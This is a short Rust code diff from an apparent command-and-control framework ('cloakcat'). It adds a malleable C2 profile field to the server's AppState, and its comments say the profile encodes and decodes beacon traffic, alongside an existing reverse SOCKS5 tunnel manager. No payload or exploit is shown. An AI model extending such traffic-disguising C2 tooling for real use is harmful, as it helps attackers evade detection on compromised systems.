@@ -3,7 +3,7 @@
 use std::collections::HashMap;
 use std::sync::Arc;
 
-use cloakcat_protocol::DerivedKeys;
+use cloakcat_protocol::{DerivedKeys, MalleableProfile};
 use sqlx::PgPool;
 use tokio::sync::{Mutex, Notify};
 
@@ -37,6 +37,10 @@ pub struct AppState {
     pub download_buffers: Arc<Mutex<HashMap<String, DownloadBuffer>>>,
     /// Reverse SOCKS5 tunnel manager.
     pub tunnel_mgr: Arc<Mutex<TunnelManager>>,
+    /// Active malleable C2 profile (loaded from MALLEABLE_PROFILE_PATH at startup).
+    /// When set, request bodies are decoded and poll responses are encoded
+    /// according to the profile's transform chain.
+    pub malleable_profile: Option<Arc<MalleableProfile>>,
 }
 
 impl AppState {
